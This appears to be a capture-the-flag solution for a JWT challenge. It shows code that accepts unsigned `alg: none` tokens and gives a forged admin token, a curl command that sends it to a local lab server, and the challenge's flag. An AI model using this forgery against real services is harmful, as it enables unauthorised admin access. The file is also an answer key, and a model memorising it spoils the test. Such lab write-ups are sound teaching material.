Solution: A12 - JWT

Concept  
JSON Web Token (JWT) signature bypass via `alg: none`.

Walkthrough  
1. Inspect `challenge/app/app.py`.
2. Notice the algorithmic bypass:
   ```python
   if header.get('alg', '').lower() == 'none':
       user_role = payload.get('role', 'guest')
   ```
3. Craft an unsigned token:
   - Header: `{"alg": "none", "typ": "JWT"}` -> `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
   - Payload: `{"user": "admin", "role": "admin"}` -> `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ`
   - Token: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.`
4. Submit the request in the `Authorization: Bearer` header:
   ```bash
   curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." http://localhost:5006/
   ```
5. Flag output: `flag{jwt token forged}`.

Flag  
`flag{jwt token forged}`
